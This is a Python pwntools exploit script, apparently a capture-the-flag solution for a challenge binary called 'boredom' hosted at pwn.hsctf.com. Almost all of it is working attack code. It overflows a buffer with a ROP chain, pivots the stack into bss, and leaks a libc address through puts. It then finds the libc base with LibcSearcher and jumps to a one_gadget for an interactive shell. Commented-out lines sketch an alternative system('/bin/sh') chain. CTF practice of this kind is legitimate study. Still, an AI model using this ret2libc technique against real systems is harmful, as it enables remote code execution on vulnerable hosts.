from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'boredom'
elf = ELF(program,checksec=False)
lokal = False
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = 'pwn.hsctf.com'
    port = '5002'
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here
pad = 216
pop_rdi = 0x0000000000401313
ret = 0x000000000040101a
libcstart = elf.got['__libc_start_main']
puts = elf.plt['puts']
main = elf.symbols['main']
leave =0x00000000004012ab

p = 'A'*(pad-8)
p += p64(elf.bss()+0x800)
p += p64(ret)
p += p64(pop_rdi)
p += p64(libcstart)
p += p64(puts)
p += p64(pop_rdi)
p += p64(elf.bss()+0x800)
p += p64(elf.plt['gets'])
p += p64(leave)


sla("do: ",p)
ru("later.\n")
leaklibc = u64(xp.recvline().strip("\n").ljust(8,"\x00"))
log.info("libc start main : {}".format(hex(leaklibc)))
libc = LibcSearcher('__libc_start_main', leaklibc)

libcbase = leaklibc - libc.dump('__libc_start_main')
# log.info("Libc Base : {}".format(hex(libcbase)))
# system_addr = libcbase + libc.dump('system')
# log.info("System address : {}".format(hex(system_addr)))
# binsh_addr = libcbase + libc.dump('str_bin_sh')
# log.info("binsh address : {}".format(hex(binsh_addr)))
one_gadget = libcbase + 0x4f322
# p = 'A'*pad
# p += p64(pop_rdi)
# p += p64(binsh_addr)
# p += p64(ret)
# p += p64(system_addr)
#
sl(p64(0)+p64(one_gadget))


xp.interactive()
